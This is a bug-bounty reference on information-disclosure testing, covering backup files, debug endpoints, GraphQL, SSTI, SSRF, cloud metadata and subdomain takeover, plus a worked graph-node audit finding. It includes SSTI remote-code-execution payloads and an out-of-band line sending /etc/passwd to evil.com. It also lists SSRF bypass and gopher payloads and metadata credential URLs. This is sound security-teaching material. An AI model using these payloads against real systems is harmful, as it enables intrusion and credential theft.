# Information Disclosure — Complete Reference

> Based on PortSwigger Web Security Academy, PayloadsAllTheThings, OWASP, Bug Bounty Checklists (2026-08)
> Covers: source code disclosure, debug messages, backup files, error messages, host header attacks, hidden data, SSTI, SSRF, GraphQL, HTTP header leakage, cloud metadata, subdomain takeover, misc disclosure vectors

---

## 1. What Is Information Disclosure?

Information disclosure (information leakage) is when a website **unintentionally reveals sensitive information** to users. Depending on the context:

- Data about other users (usernames, financial info)
- Sensitive commercial/business data
- Technical details about infrastructure (frameworks, versions, internal paths)
- Credentials, API keys, tokens hardcoded in source
- Internal directory structure, backup files, database schemas

> Key principle: Technical disclosure alone may be low severity, but it becomes **high severity** when it enables a more devastating attack (known CVE, privilege escalation, full compromise).

---

## 2. Categories of Information Disclosure

### 2.1 Failure to Remove Internal Content from Public

**Source Code Disclosure:**
- HTML comments with developer notes, TODO items, internal URLs
- JavaScript source maps (`.map` files) exposing original source
- HTML source revealing internal IPs, endpoints, function names
- Unminified JavaScript containing debug code

**Backup Files:**
- `.bak`, `.old`, `.orig`, `.save`, `.swp`, `~` backup files
- `index.php.bak`, `web.config.bak`, `.env.bak`
- Database dumps: `dump.sql`, `backup.sql`, `db.sql`
- ZIP/TAR archives: `backup.zip`, `site.tar.gz`, `www.zip`
- Temp files: `.DS_Store`, `Thumbs.db`

**Hidden Directories:**
- `robots.txt` revealing disallowed paths (often sensitive)
- `sitemap.xml` exposing all URLs
- `.git/` repository exposed (full source code + history)
- `.svn/` repository exposed
- `.env` file exposed (database credentials, API keys)

### 2.2 Insecure Configuration

**Verbose Error Messages:**
- Full stack traces with file paths, line numbers, database queries
- Database error messages revealing table/column names
- Framework version information in error pages
- Debug mode left enabled in production

**Server Version Disclosure:**
- `Server: Apache/2.4.41 (Ubuntu)` header
- `X-Powered-By: PHP/7.4.3` header
- `X-AspNet-Version: 4.0.30319` header
- `X-Runtime: Ruby/2.7.0` header

**Default Configurations:**
- Default credentials on admin panels
- Default error pages with version info
- Directory listing enabled
- Debug endpoints accessible (e.g., `/debug`, `/trace`, `/actuator`)

### 2.3 Flawed Design & Behavior

**User Enumeration:**
- Different responses for valid vs invalid usernames
- Registration forms revealing if email already exists
- Password reset revealing if account exists
- Login timing differences

**ID Enumeration:**
- Sequential IDs in URLs: `/user/123`, `/order/456`
- API endpoints returning more data than needed
- GraphQL introspection exposing entire schema

---

## 3. Source Code Disclosure Techniques

### 3.1 HTML/JS Analysis

**Developer Comments:**
```html
<!-- TODO: Fix auth bypass - admin password is admin123 -->
<!-- Internal API: https://api.internal.company.com/v2 -->
<!-- Debug mode: set DEBUG=true in env -->
```

**JavaScript Analysis:**
```bash
# Search for hardcoded secrets
grep -r "API_KEY\|SECRET\|TOKEN\|PASSWORD\|CREDENTIAL" *.js
grep -r "http[s]?://" *.js
grep -r "BEGIN RSA" *.js

# Look for debug/dev endpoints
grep -r "debug\|test\|staging\|dev\." *.js
```

**Source Maps:**
```
/main.js.map
/app.js.map
/bundle.js.map
/assets/js/*.map
```

### 3.2 Backup File Discovery

**Common patterns:**
```
index.php.bak
index.php~
index.php.orig
index.php.save
index.php.old
web.config.bak
.htaccess.bak
.env.bak
.gitignore
.DS_Store
Thumbs.db
```

**Forced browsing paths:**
```
/backup/
/backups/
/.backup/
/temp/
/tmp/
/old/
/archive/
/deploy/
/.deploy/
```

**Fuzzing for backup files:**
```bash
# Using ffuf
ffuf -u https://target.com/FUZZ -w /path/to/backup-wordlist.txt

# Using feroxbuster
feroxbuster -u https://target.com -w /path/to/backup-wordlist.txt

# Common backup extensions
.bak .old .orig .save .swp .tmp .copy .backup .archive .tar.gz .zip .sql
```

### 3.3 Git Repository Exposure

**Detection:**
```
/.git/config
/.git/HEAD
/.git/index
/.gitignore
```

**Tools:**
```bash
# git-dumper
python3 git_dumper.py https://target.com/.git/ ./dumped-git

# GitTools
./Extractor/Extractor.sh https://target.com/.git/ ./git-data
```

**Impact:** Full source code access, commit history with secrets, developer emails, internal paths

### 3.4 SVN Repository Exposure

**Detection:**
```
/.svn/entries
/.svn/wc.db
/.svn/dir-prop-base
```

---

## 4. Debug Messages & Verbose Errors

### 4.1 Common Debug Endpoints

```
/debug
/debug/vars
/debug/pprof
/debug/requests
/debug/console
/.well-known/debug
/trace
/actuator
/actuator/env
/actuator/health
/actuator/heapdump
/actuator/configprops
```

### 4.2 Stack Trace Analysis

**PHP:**
```
Warning: mysql_connect(): Access denied for user 'root'@'localhost'
in /var/www/html/config.php on line 42
```

**Python/Django:**
```
OperationalError: (1045, "Access denied for user 'app'@'localhost' (using password: YES)")
File "/var/www/app/views.py", line 87, in get_user
    cursor.execute("SELECT * FROM users WHERE id = %s", [user_id])
```

**Java:**
```
java.lang.NullPointerException
    at com.example.app.controller.UserController.getUser(UserController.java:45)
    at org.apache.catalina.core.StandardWrapper.invoke(StandardWrapper.java:1422)
```

**Node.js:**
```
Error: Cannot find module './config/database'
    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:794)
    at Object.<anonymous> (/var/www/app/server.js:15:12)
```

### 4.3 Database Error Disclosure

**SQL Errors:**
```
You have an error in your SQL syntax; check the manual for MySQL 5.7.34
SELECT * FROM users WHERE id = '1' AND password = ''
```

**NoSQL Errors:**
```
MongoServerError: {
  "ok": 0,
  "errmsg": "bad auth : authentication failed",
  "code": 18,
  "codeName": "AuthenticationFailed"
}
```

### 4.4 Framework Version Disclosure

**In Error Messages:**
```
Django/3.2.15
Flask/2.2.2
Express/4.18.1
Rails/6.1.6
Spring/5.3.23
```

**In Default Pages:**
```
Apache Tomcat/9.0.65
JSP Warning: /admin.jsp
ASP.NET 4.0.30319
PHP/7.4.33
```

---

## 5. Host Header Attacks

### 5.1 Password Reset Poisoning

**Attack:**
```
POST /password-reset HTTP/1.1
Host: evil.com

email=victim@target.com
```

**Impact:** Password reset link sent to victim with evil.com as host → attacker captures reset token

### 5.2 Virtual Host Enumeration

**Attack:** Send requests with different Host headers to find internal virtual hosts:
```
Host: internal.target.com
Host: admin.target.com
Host: staging.target.com
Host: api.target.com
Host: vpn.target.com
```

### 5.3 Web Cache Poisoning

**Attack:** Manipulate Host header to poison cache with malicious content:
```
GET /page HTTP/1.1
Host: evil.com
```

### 5.4 Host Header Injection Techniques

```
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Original-URL: /admin
X-Rewrite-URL: /admin
Forwarded: host=evil.com
```

---

## 6. HTTP Header Information Leakage

### 6.1 Sensitive Headers

| Header | Information Revealed |
|---|---|
| `Server` | Server software + version |
| `X-Powered-By` | Backend technology + version |
| `X-AspNet-Version` | ASP.NET version |
| `X-Runtime` | Ruby version |
| `X-Generator` | CMS generator |
| `X-Debug-Token` | Debug token for Symfony |
| `X-Debug-Token-Link` | Link to debug info |
| `X-Request-ID` | Internal request tracking |
| `X-Debug` | Debug mode indicator |
| `Via` | Proxy server info |

### 6.2 Security Headers to Check

```
Content-Security-Policy          → Missing = clickjacking, XSS possible
X-Frame-Options                 → Missing = clickjacking
Strict-Transport-Security       → Missing = downgrade attacks
X-Content-Type-Options          → Missing = MIME sniffing
Referrer-Policy                  → Missing = referrer leakage
Permissions-Policy               → Missing = feature abuse
```

---

## 7. User Enumeration Vectors

### 7.1 Login Page

```
# Different error messages
"Invalid username" → Username doesn't exist
"Invalid password" → Username exists, password wrong

# Timing attacks
Different response time for valid vs invalid username
DB query with valid user takes longer

# HTTP status codes
200 for invalid user, 302 redirect for valid user
```

### 7.2 Registration Page

```
# Email existence check
"Email already registered" → Email exists
"Registration successful" → Email was new
```

### 7.3 Password Reset

```
# Reset flow reveals account existence
"Reset link sent to your email" → Account exists
"Email not found" → Account doesn't exist
```

### 7.4 API Enumeration

```
# Sequential IDs
GET /api/user/1 → {"id": 1, "name": "admin"}
GET /api/user/2 → {"id": 2, "name": "john"}

# Batch enumeration
GET /api/user/1-100 → All users listed
```

---

## 8. GraphQL Information Disclosure

### 8.1 Common Endpoints

```
/graphql
/graphiql
/graphql/console
/graphql.php
/graphiql.php
/v1/explorer
/v1/graphiql
/graph
/api/graphql
```

### 8.2 Introspection Query

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}
```

### 8.3 Information Disclosure via GraphQL

- Full schema introspection reveals all types, fields, mutations
- Error messages reveal internal type names
- Suggestion feature reveals field names
- Batch queries can bypass rate limits
- Nested queries can extract relationships between types
- Mutations can expose internal operations

### 8.4 GraphQL Security Checklist

```bash
# Introspection enabled
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Suggestions enabled (leaks field names)
curl -s "https://target.com/graphql?query={__type(name:\"User\"){fields{name}}}"

# Batch queries (rate limit bypass)
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name,email}}"},{"query":"{user(id:2){name,email}}"}]'
```

---

## 9. Server-Side Template Injection (SSTI)

### 9.1 What Is SSTI?

When user input is embedded into a template before rendering, an attacker can inject template syntax to achieve code execution.

### 9.2 Detection Polyglots

```
${{<%[%'\"}}%\.
```

**Mathematical expressions:**
```
{{7*7}}          → Jinja2/Twig (renders 49)
#{7*7}           → Thymeleaf (renders 49)
<%= 7*7 %>       → ERB (renders 49)
${7*7}           → FreeMarker/Velocity (renders 49)
{{= 7*7 }}       → Nunjucks (renders 49)
*{7*7}           → Mako (renders 49)
```

### 9.3 Template Engine Identification

| Response | Engine |
|---|---|
| 49 (from `{{7*7}}`) | Jinja2/Twig |
| Error: ZeroDivisionError | Python (Jinja2/Mako) |
| Error: java.lang.ArithmeticException | Java (Freemarker/Velocity) |
| Error: Division by zero | PHP |
| Error: divided by 0 | Ruby (ERB) |
| Error: ReferenceError | Node.js (Nunjucks) |

### 9.4 SSTI Exploitation by Engine

**Jinja2 (Python):**
```python
# RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('cat /etc/passwd').read()}}

# File read
{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}
```

**Twig (PHP):**
```php
# RCE
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
```

**FreeMarker (Java):**
```java
# RCE
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
<#assign classloader=object.class.protectionDomain.classLoader>
```

**Velocity (Java):**
```java
# RCE
#set($class=$class.forName("java.lang.Runtime"))
#set($chr=$class.forName("java.lang.Character"))
#set($str=$class.forName("java.lang.String"))
```

### 9.5 Blind SSTI

```
# Time-based
{{request.application.__globals__.__builtins__.__import__('time').sleep(5)}}

# Boolean-based (extract data character by character)
{{config.items()[0][1]['SECRET_KEY'][0] == 'a'}}

# Out-of-band
{{config.__class__.__init__.__globals__['os'].popen('curl http://evil.com/?data=$(cat /etc/passwd)')}}
```

---

## 10. Server-Side Request Forgery (SSRF)

### 10.1 What Is SSRF?

SSRF allows an attacker to force a server to make requests to unintended locations — typically internal network resources.

### 10.2 Common SSRF Parameters

```
url, uri, path, dest, redirect, feed, img, image, file, reference
site, html, val, continue, return, next, data, domain, callback
page, path, load, target, src, source, document, folder
```

### 10.3 Default SSRF Targets

```
# AWS Metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP Metadata
http://metadata.google.internal/computeMetadata/v1/
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure Metadata
http://169.254.169.254/metadata/instance?api-version=2021-02-01

# Kubernetes
https://kubernetes.default.svc
https://kubernetes.default.svc/api/v1/namespaces
```

### 10.4 SSRF Filter Bypass Techniques

**IPv6 Notation:**
```
http://[::]:80/
http://[0000::1]:80/
http://[::ffff:127.0.0.1]
http://[0:0:0:0:0:ffff:127.0.0.1]
```

**Encoded IP Addresses:**
```
Decimal:  http://2130706433/       → 127.0.0.1
Hex:      http://0x7f000001        → 127.0.0.1
Octal:    http://0177.0.0.1/       → 127.0.0.1
Short:    http://0/                → 0.0.0.0
```

**Domain Redirects:**
```
localtest.me              → ::1
localh.st                 → 127.0.0.1
company.127.0.0.1.nip.io  → 127.0.0.1
spoofed.[COLLABORATOR]    → 127.0.0.1
```

**DNS Rebinding:**
```
# 1u.ms rebinding service
make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
```

**URL Parsing Discrepancy:**
```
http://127.1.1.1:80\@127.2.2.2:80/
http://127.1.1.1:80\@@127.2.2.2:80/
http://127.1.1.1:80:\@@127.2.2.2:80/
http://127.1.1.1:80#\@127.2.2.2:80/
http:127.0.0.1/
```

**URL Scheme Abuse:**
```
file:///etc/passwd                    → File read
dict://attacker:11111/                → DICT protocol
sftp://evil.com:11111/                → SFTP
tftp://evil.com:12346/TESTUDPPACKET   → TFTP (UDP)
gopher://localhost:25/_MAIL...        → SMTP via Gopher
ldap://localhost:11211/...            → LDAP/Memcached
netdoc:///etc/passwd                  → Java file read
jar:http://127.0.0.1!/               → Java JAR (blind)
```

### 10.5 Blind SSRF Exploitation

**Chains to achieve impact:**
```
# Elasticsearch
http://localhost:9200/_search?q=@\\n\\n{"script":{"source":"..."}}

# Weblogic
http://localhost:7001/uddiexplorer/

# Consul
http://localhost:8500/v1/catalog/register

# Redis (via gopher)
gopher://localhost:6379/_SET%20pwned%20true%0D%0A

# Tomcat (via gopher)
gopher://localhost:8080/_PUT%20/shell.jsp%20HTTP/1.1...
```

### 10.6 SSRF to XSS

```
# SVG with JavaScript payload
https://example.com/ssrf.php?url=http://attacker.com/poc.svg
```

---

## 11. Cloud Metadata Attacks (via SSRF)

### 11.1 AWS

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
http://169.254.169.254/latest/meta-data/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (requires token)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/
```

### 11.2 GCP

```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/project/project-id

# Requires header
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
```

### 11.3 Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# Requires header
curl -H "Metadata: true" http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### 11.4 DigitalOcean

```
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/user-data
```

---

## 12. Subdomain Takeover

### 12.1 What Is It?

A subdomain points to an external service (e.g., GitHub Pages, Heroku, AWS S3) but the claim on that service has expired. Attacker can claim the service and serve content on the subdomain.

### 12.2 Detection

```bash
# Find dangling CNAMEs
subfinder -d target.com -silent | dnsx -cname -silent | grep -i "CNAME.*NXDOMAIN"

# Check with nuclei
nuclei -l subdomains.txt -t ~/nuclei-templates/http/takeover/

# Manual check
dig CNAME subdomain.target.com
# If CNAME points to herokuapp.com, check if the app exists
```

### 12.3 Vulnerable Services

| Service | Vulnerable When |
|---|---|
| GitHub Pages | Repository deleted |
| Heroku | App deleted |
| AWS S3 | Bucket deleted |
| Azure | Account deleted |
| Shopify | Store deleted |
| Fastly | App deleted |
| Surge.sh | Project deleted |
| WordPress.com | Blog deleted |

---

## 13. Miscellaneous Disclosure Vectors

### 13.1 robots.txt Analysis

```
User-agent: *
Disallow: /admin/
Disallow: /internal/
Disallow: /backup/
Disallow: /.git/
Disallow: /config/
Sitemap: https://target.com/sitemap.xml
```

**Often reveals:**
- Hidden admin panels
- Internal paths
- Backup directories
- API endpoints
- Staging environments

### 13.2 .DS_Store (macOS)

```bash
# Parse .DS_Store file
python3 ds_store.py .DS_Store
# Reveals all files in the directory
```

### 13.3 XML Files

```
/web.config
/sitemap.xml
/feed.xml
/rss.xml
/atom.xml
/crossdomain.xml
/clientaccesspolicy.xml
```

### 13.4 JavaScript File Analysis

```bash
# Find all JS files
gau --js target.com | grep "\.js$" | sort -u

# Search for endpoints
grep -oP '["'"'"']/[a-zA-Z0-9/_-]+["'"'"']' *.js | sort -u

# Search for API keys
grep -oP '["'"'"']([A-Za-z0-9+/]{40,})["'"'"']' *.js
grep -i "api_key\|apikey\|api-key\|secret\|token" *.js
```

### 13.5 Crossdomain.xml (Flash/Silverlight)

```xml
<cross-domain-policy>
    <allow-access-from domain="*.target.com" />
    <allow-access-from domain="*.attacker.com" />
</cross-domain-policy>
```

### 13.6 Environment Files

```
/.env
/.env.local
/.env.production
/.env.staging
/.env.development
/.env.bak
/.env.old
```

### 13.7 API Documentation

```
/swagger-ui.html
/swagger-ui/
/api-docs
/swagger.json
/openapi.json
/openapi.yaml
/api/v1/docs
/redoc
/docs
/api
```

---

## 14. Bug Bounty Hunting Methodology

### 14.1 Information Gathering Phase

```
1. Technology Fingerprinting
   - Wappalyzer / BuiltWith
   - HTTP headers (Server, X-Powered-By)
   - Error pages
   - Default files (robots.txt, sitemap.xml)
   - JavaScript frameworks

2. Directory/File Discovery
   - ffuf/feroxbuster for directory fuzzing
   - Common backup files
   - Hidden admin panels
   - API documentation endpoints

3. JavaScript Analysis
   - Find all JS files
   - Extract endpoints, secrets, debug flags
   - Analyze source maps
   - Check for hardcoded credentials

4. Subdomain Enumeration
   - Subfinder, amass, Sublist3r
   - Certificate Transparency logs
   - DNS bruteforcing
   - Check for dangling CNAMEs (subdomain takeover)
```

### 14.2 Testing for Disclosure

```
1. Source Code Disclosure
   - HTML comments
   - JavaScript source maps
   - Backup files (.bak, .old, .swp)
   - Git/SVN repository exposure

2. Error Handling
   - Send malformed input
   - Check for verbose error messages
   - Look for stack traces
   - Test for debug endpoints

3. HTTP Header Analysis
   - Check Server header
   - Check X-Powered-By
   - Check for missing security headers

4. GraphQL Testing
   - Introspection query
   - Error-based schema discovery
   - Batch query abuse

5. Host Header Testing
   - Password reset poisoning
   - Virtual host enumeration
   - Cache poisoning

6. Cloud Metadata (SSRF)
   - Test for SSRF parameters
   - Attempt cloud metadata access
   - Check for IMDSv1 vs IMDSv2
```

### 14.3 Severity Assessment

| Finding | Typical Severity |
|---|---|
| API keys in source | Medium-High (depends on scope) |
| Database credentials | Critical |
| Full source code access | Critical |
| Verbose error messages | Low-Medium |
| Server version disclosure | Low |
| robots.txt with hidden paths | Informational |
| User enumeration | Low-Medium |
| Subdomain takeover | High |
| Cloud metadata access | Critical |
| SSTI | Critical |
| SSRF to internal network | High-Critical |

---

## 15. Report Templates

### Template 1: Source Code Disclosure
```
Title: [App] Source Code Disclosure via [Backup File/Git/Comment]

Severity: [High]

Description:
The application exposes source code through [backup files/version control/
developer comments]. An attacker can access [file] and obtain the full
application source code including [hardcoded credentials/database connection
strings/internal API keys].

Reproduction:
1. Navigate to [URL]
2. Access [path]
3. Observe: [source code/credentials] exposed

Impact:
- Full application logic disclosure
- Hardcoded credentials for database/API access
- Enables further exploitation

Remediation:
- Remove all backup files from production
- Block .git/.svn directories in web server config
- Strip developer comments before deployment
- Implement automated code scanning
```

### Template 2: SSTI
```
Title: [App] Server-Side Template Injection Leading to RCE

Severity: Critical (CVSS 9.8)

Description:
The [parameter] is processed by [template engine] without proper
sanitization, allowing Server-Side Template Injection that escalates
to Remote Code Execution.

Reproduction:
1. Navigate to [URL]
2. Input {{7*7}} in [parameter]
3. Observe: 49 rendered (SSTI confirmed)
4. Input payload for RCE
5. Observe: command execution

Impact:
- Complete server compromise
- Access to all data
- Pivot to internal network

Remediation:
- Never use user input in template expressions
- Use sandboxed template engines
- Implement input validation
```

### Template 3: SSRF to Cloud Metadata
```
Title: [App] SSRF Leading to AWS/GCP/Azure Metadata Access

Severity: Critical (CVSS 9.1)

Description:
The [parameter] allows Server-Side Request Forgery that bypasses
network restrictions to access cloud instance metadata, exposing
IAM credentials and instance configuration.

Reproduction:
1. Navigate to [URL]
2. Set [parameter] to [SSRF payload]
3. Observe: cloud metadata response

Impact:
- Access to IAM credentials
- Potential lateral movement
- Data exfiltration from cloud storage

Remediation:
- Validate and whitelist URLs
- Block access to metadata endpoints
- Use IMDSv2 (requires token)
- Implement network segmentation
```

---

## 16. Detection Checklist

### Source Code Disclosure
- [ ] Check HTML source for developer comments
- [ ] Search JavaScript for hardcoded secrets
- [ ] Check for source maps (.map files)
- [ ] Test common backup file extensions (.bak, .old, .swp)
- [ ] Check for .git/.svn repository exposure
- [ ] Test for .env file exposure
- [ ] Check for API documentation (/swagger, /api-docs)
- [ ] Search JS files for API keys and tokens

### Error Handling
- [ ] Send malformed input and check error response
- [ ] Look for stack traces in error messages
- [ ] Check for debug mode indicators
- [ ] Test for debug endpoints (/debug, /actuator, /trace)
- [ ] Check database error disclosure
- [ ] Test for version information in errors

### HTTP Headers
- [ ] Check Server header for version info
- [ ] Check X-Powered-By header
- [ ] Check for missing security headers
- [ ] Test Host header manipulation
- [ ] Check for internal IP addresses in headers

### GraphQL
- [ ] Test for introspection query
- [ ] Check for suggestion feature
- [ ] Test batch query limits
- [ ] Enumerate all types and fields
- [ ] Check for nested query data exposure

### SSRF
- [ ] Identify all URL/URI parameters
- [ ] Test for cloud metadata access
- [ ] Test for internal network scanning
- [ ] Check for blind SSRF (OOB)
- [ ] Test filter bypass techniques

### Backup Files
- [ ] Test common backup extensions
- [ ] Check forced browsing to backup directories
- [ ] Look for ZIP/TAR/SQL dumps
- [ ] Check for .DS_Store/Thumbs.db files
- [ ] Test for old/staging versions

---

## 17. Sink-Fidelity — redaction at the LOG is NOT redaction at the SINK

> Highest-leverage heuristic for finding a *novel* info-disclosure in a mature codebase.
> Works when the target is not a website at all (self-hosted node, daemon, indexer, backend service).

When a project clearly *cares* about a secret, it usually says so in code: a `redact*` flag, a
`[REDACTED]` string, a scrub/mask helper, a regex that matches URLs or tokens. That is your
signpost. For every such scrub, ask **where it is applied**:

```
find the redactor  ->  follow the value  ->  every sink it reaches  ->  the sink WITHOUT the redactor is the finding
```

Typical sinks that a log-site redactor does not cover:
- persisted rows / event payloads / queues (the value is stored raw)
- HTTP + GraphQL responses, especially **status / debug / admin APIs** that echo stored errors
- metrics labels, traces, crash reporters
- child-process argv, temp files, dashboards

```bash
grep -rn "redact\|REDACTED\|mask_\|scrub\|sanitize_" --include=*.{rs,go,ts,py,java} .
```

### Error-object fidelity (sibling rule)
Separate the *pretty client error* from the *stored/propagated error*. Code that formats the
FULL error chain for storage re-injects paths, SQL, URLs and tokens into whatever later serves
that stored string:
- Rust `format!("{:#}", e)` (anyhow chain) · Go `%+v` / unwrapped cause loops · Python
  `traceback.format_exc()` / `str(e.__cause__)` · Node `err.stack` / `Error.cause`
Check BOTH the immediate HTTP response **and** anything that persists the error (status API,
DB row, event log) — the persistence path usually has no sanitizer.

### Worked instance — graph-node (Rust, 2026-10)
- `graph/src/util/futures.rs` carries a `redact_log_urls` flag that regex-strips `https?://…`
  **only inside the string passed to `warn!`/`debug!`**. The error value returned to the caller
  is left untouched.
- ~25 RPC call sites in `chain/ethereum/src/ethereum_adapter.rs` set `.redact_log_urls(true)` —
  which is itself proof the error strings contain provider URLs.
- `core/src/subgraph/runner/mod.rs` builds the persisted message with `format!("{:#}", e)`.
- `graph/src/data/subgraph/status.rs` serialises `fatalError.message` / `nonFatalErrors[].message`
  straight to clients; `server/index-node` serves that API with no auth for those fields (its
  optional token gates only `proofOfIndexing`).
- Net: the operator's hosted-RPC URL — i.e. the Alchemy/Infura/QuickNode **API key** — is
  disclosed by an unauthenticated endpoint. The team's own redactor proves they consider the
  URL sensitive; the mitigation simply sits at the wrong layer.

### Credential-in-URL is a first-class class
These land in error chains constantly, so any echoed error is a potential credential leak:
hosted RPC providers, Slack/Discord webhook URLs, presigned S3/GS URLs, JWT/`?token=` query
strings, database DSNs (`postgres://user:pass@host/db`), and Basic-auth-in-URL.

---

## 18. Self-hosted daemon / backend-service surface (bind, auth coverage, default exposure)

For any self-hosted service (graph-node, Prometheus, Elastic, MQTT broker, node-exporter,
an indexer/agent daemon …) the web-app checklist above is the wrong shape. Use this instead:

1. **Enumerate every server** in the tree: `server/*`, `*_server.rs`, `app.listen(...)`,
   `http.createServer(...)`, router constructors.
2. For each server record four facts:
   - **bind address** — `0.0.0.0` / `::` (all interfaces) vs `127.0.0.1` / `::1`.
     In Rust: `SocketAddr::from(([0,0,0,0], port))` is all interfaces.
   - **auth, and its COVERAGE** — not just "is there middleware". A token that protects exactly
     one field or one route leaves every other route open. Trace what the guard wraps.
   - **default port + start condition** — is the server started unconditionally, or behind an
     enable flag / env gate? `default_value = "8020"` + unconditional start = on by default.
   - **log-message fidelity** — a log line saying "listening on localhost" while the socket is
     bound to `0.0.0.0` is a strong tell of an oversight; quote the mismatch in the report.
3. **Check the official deployment artifacts** for default exposure — this is what upgrades
   "operator misconfiguration" into "insecure default":
   ```bash
   grep -rn "ports:" -A12 docker-compose*.yml ; grep -rn "EXPOSE" Dockerfile*
   grep -rn "containerPort\|hostPort" **/values*.yaml ; grep -rniE "80[0-9]{2}:" docs/ docker/
   ```
   A published admin/metrics/status port in the canonical compose file is a material fact.
4. **Fingerprint the unauth endpoints' return shape** — verbose status/debug routes often echo
   internal state (error messages, config, env, version, DSNs). GraphQL status APIs
   (`indexingStatuses { fatalError { message } }`) are a common echo point.

**Severity framing.** An unauthenticated admin API bound to all interfaces is a real insecure
default, but check the program's impact table FIRST. A narrow table may not list it, and
"best practice critique" / "misconfiguration" are common explicit exclusions — if no in-scope
impact is demonstrably reachable, file it as an observation, not a claimed bounty. Combine it
with a sink-fidelity leak (§17) when you need a concrete in-scope impact.

---

*Last updated: 2026-10-03 | Sources: PortSwigger Academy, PayloadsAllTheThings, OWASP, Bug Bounty Checklists; §17/§18 from graph-node (Rust) audit 2026-10*
